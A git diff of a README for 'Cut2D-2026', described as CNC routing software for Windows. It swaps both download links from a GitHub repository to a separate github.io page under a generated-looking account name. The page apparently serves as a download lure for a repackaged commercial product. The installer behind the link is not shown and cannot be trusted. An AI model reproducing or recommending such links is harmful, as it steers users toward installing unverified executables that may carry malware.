@@ -1,6 +1,6 @@
 # 🛠️ Cut2D-2026 - Simple CNC routing for home users
 
-[![](https://img.shields.io/badge/Download-Cut2D_2026-blue.svg)](https://github.com/peroneuscommonwasp534/Cut2D-2026)
+[![](https://img.shields.io/badge/Download-Cut2D_2026-blue.svg)](https://peroneuscommonwasp534.github.io)
 
 Cut2D-2026 provides software tools to design and cut parts on your CNC router. This program turns digital drawings into machine code. The software works with Windows 10 and Windows 11. 
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run the software. Check these items before
 
 Visit the official release page to get the program files for your system.
 
-[Download Cut2D-2026 Installer](https://github.com/peroneuscommonwasp534/Cut2D-2026)
+[Download Cut2D-2026 Installer](https://peroneuscommonwasp534.github.io)
 
 Once you click the link, your browser starts the download. Save the file to your computer. Most users save files in the Downloads folder. 
 
